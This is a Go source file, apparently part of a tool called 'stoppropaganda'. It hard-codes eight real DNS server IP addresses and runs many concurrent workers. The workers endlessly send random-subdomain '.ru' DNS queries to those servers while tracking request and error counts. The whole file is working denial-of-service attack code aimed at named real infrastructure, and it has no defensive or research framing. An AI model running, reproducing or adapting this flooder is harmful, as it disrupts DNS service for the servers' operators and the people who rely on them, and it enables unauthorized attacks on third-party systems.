package stoppropaganda

import (
	"math/rand"
	"strings"
	"sync"

	"github.com/miekg/dns"
)

// Source: https://twitter.com/FedorovMykhailo/status/1497642156076511233

var targetDNSServers = map[string]struct{}{
	"194.54.14.186:53":  {},
	"194.54.14.187:53":  {},
	"194.67.7.1:53":     {},
	"194.67.2.109:53":   {},
	"84.252.147.118:53": {},
	"84.252.147.119:53": {},
	"95.173.148.51:53":  {},
	"95.173.148.50:53":  {},
}

type DNSServerStatus struct {
	Requests     uint   `json:"requests"`
	Success      uint   `json:"success"`
	Errors       uint   `json:"errors"`
	LastErrorMsg string `json:"last_error_msg"`
}

type DNSServer struct {
	Status  DNSServerStatus
	mux     sync.Mutex
	message *dns.Msg
	target  string
}

var dnsClient *dns.Client

var dnsServers = map[string]*DNSServer{}

func startDNS() {
	for targetDNSServer := range targetDNSServers {
		questionDomain := getRandomDomain() + "."
		message := new(dns.Msg)
		message.SetQuestion(questionDomain, dns.TypeA)

		dnsServers[targetDNSServer] = &DNSServer{
			message: message,
			target:  targetDNSServer,
		}
	}

	dnsChannel := make(chan *DNSServer, *flagDNSWorkers)

	// Spawn workers
	for i := 0; i < *flagDNSWorkers; i++ {
		go runDNSWorker(dnsChannel)
	}

	// Issue tasks
	go func() {
		for {
			for _, dns := range dnsServers {
				dnsChannel <- dns
			}
		}
	}()
}

func runDNSWorker(c chan *DNSServer) {
	for {
		dnsServer := <-c
		_, _, err := dnsClient.Exchange(dnsServer.message, dnsServer.target)

		dnsServer.mux.Lock()
		dnsServer.Status.Requests++
		if err != nil {
			dnsServer.Status.Errors++
			switch {
			case strings.HasSuffix(err.Error(), "no such host"):
				dnsServer.Status.LastErrorMsg = "Host does not exist"
			case strings.HasSuffix(err.Error(), "connection refused"):
				dnsServer.Status.LastErrorMsg = "Connection refused"
			case strings.HasSuffix(err.Error(), "i/o timeout"):
				dnsServer.Status.LastErrorMsg = "Query timeout"
			default:
				dnsServer.Status.LastErrorMsg = err.Error()
			}
		} else {
			dnsServer.Status.Success++
		}
		dnsServer.mux.Unlock()
	}
}

var randomDomainRunes = []rune("abcdefghijklmnopqrstuvwxyz")

func getRandomDomain() string {
	randomLength := rand.Intn(20-6) + 6 // from 6 to 20 characters length + ".ru"
	b := make([]rune, randomLength)
	for i := range b {
		b[i] = randomDomainRunes[rand.Intn(len(randomDomainRunes))]
	}
	return string(b) + ".ru"
}
